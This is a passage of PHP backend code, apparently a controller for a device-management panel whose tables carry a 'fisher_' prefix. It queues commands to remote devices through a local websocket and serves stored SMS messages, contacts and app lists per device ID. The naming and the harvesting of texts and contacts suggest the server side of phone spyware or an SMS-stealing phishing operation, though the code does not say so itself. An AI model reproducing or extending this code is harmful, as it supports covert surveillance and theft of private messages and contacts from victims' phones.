    protected function notifyWs(string $did, string $cmd, array $params): void
    {
        try {
            $ch = curl_init('http://127.0.0.1:8889/internal/device-command');
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode(['deviceId' => $did, 'command' => $cmd, 'params' => (object)$params], JSON_UNESCAPED_UNICODE),
                CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT_MS => 800,
                CURLOPT_NOSIGNAL => 1,
            ]);
            curl_exec($ch);
            curl_close($ch);
        } catch (\Throwable $e) {}
    }

    protected function deviceCommands(string $did)
    {
        $rows = Db::table('fisher_pending_commands')->where('device_id', $did)->order('id', 'desc')->limit(100)->select()->toArray();
        $out = [];
        foreach ($rows as $r) {
            $j = json_decode((string)$r['command_json'], true) ?: [];
            $out[] = [
                'id' => (string)($j['id'] ?? $r['id']),
                'command' => (string)($j['command'] ?? ''),
                'payload' => $j['params'] ?? null,
                'picked' => !empty($r['picked_at']),
                'created_at' => (int)($r['created_at'] ?? 0),
            ];
        }
        return $this->json(['success' => true, 'data' => $out, 'items' => $out, 'total' => count($out)]);
    }

    protected function deviceSms(string $did)
    {
        $rows = Db::table('fisher_sms_messages')->where('device_id', $did)->order('id', 'desc')->limit(500)->select()->toArray();
        return $this->json(array_map(function ($r) {
            $addr = (string)($r['address'] ?? $r['phone'] ?? $r['sender'] ?? '');
            $body = (string)($r['body'] ?? $r['content'] ?? '');
            $ts   = (int)($r['timestamp'] ?? 0);
            if ($ts <= 0) $ts = (int)($r['date'] ?? 0);
            if ($ts > 0 && $ts < 100000000000) $ts = $ts * 1000;
            if ($ts <= 0) $ts = (int)($r['created_at'] ?? 0) * 1000;
            return [
                'id'         => (int)$r['id'],
                'device_id'  => (string)($r['device_id'] ?? ''),
                'address'    => $addr,
                'phone'      => $addr,
                'body'       => $body,
                'content'    => $body,
                'type'       => (int)($r['type'] ?? 1),
                'read'       => (bool)($r['read'] ?? 0),
                'recv_at'    => $ts,
                'timestamp'  => $ts,
                'date'       => (string)($r['date'] ?? ''),
                'created_at' => (int)($r['created_at'] ?? 0) * 1000,
            ];
        }, $rows));
    }

    protected function deviceContacts(string $did)
    {
        if ($this->method === 'DELETE') {
            Db::table('fisher_contacts')->where('device_id', $did)->delete();
            return $this->json(['success' => true, 'data' => null]);
        }
        $rows = Db::table('fisher_contacts')->where('device_id', $did)->order('id', 'desc')->limit(2000)->select()->toArray();
        return $this->json(array_map(function ($r) {
            return [
                'id' => (int)$r['id'],
                'name' => (string)($r['name'] ?? ''),
                'phone' => (string)($r['phone'] ?? ''),
                'number' => (string)($r['phone'] ?? ''),
                'email' => (string)($r['email'] ?? ''),
                'created_at' => (int)($r['created_at'] ?? 0) * 1000,
            ];
        }, $rows));
    }

    protected function deviceApps(string $did)
    {
